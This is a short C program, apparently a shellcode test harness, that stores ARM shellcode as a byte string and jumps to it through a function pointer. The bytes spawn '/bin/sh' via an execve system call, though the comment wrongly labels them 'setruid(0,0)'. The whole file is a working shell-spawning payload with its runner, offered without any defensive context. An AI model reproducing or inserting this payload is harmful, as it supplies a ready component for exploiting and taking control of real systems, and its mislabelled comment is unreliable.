char shellcode[] =                  // white space, such as carriage returns doesn't matter
    // setruid(0,0)
    "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x02\xa0\x49\x40\x52\x40\xc2\x71\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68\x78";
    
int main()
{
    void (*fp)(void);               // declare a function pointer, fp
    fp = (void *) shellcode;        // set the address of fp to our shellcode
    fp();
}
